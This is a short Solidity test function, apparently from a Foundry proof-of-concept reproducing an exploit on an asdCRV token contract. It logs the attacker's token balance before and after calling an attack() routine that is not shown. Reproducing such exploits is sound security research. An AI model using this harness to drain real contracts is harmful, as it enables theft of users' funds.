function testExploit() external {
    emit log_named_decimal_uint(
        "[Begin] Attacker asdCRV balance before exploit", asdCRV.balanceOf(address(this)), asdCRV.decimals()
    );
    attack();
    emit log_named_decimal_uint(
        "[End] Attacker asdCRV balance after exploit", asdCRV.balanceOf(address(this)), asdCRV.decimals()
    );
}
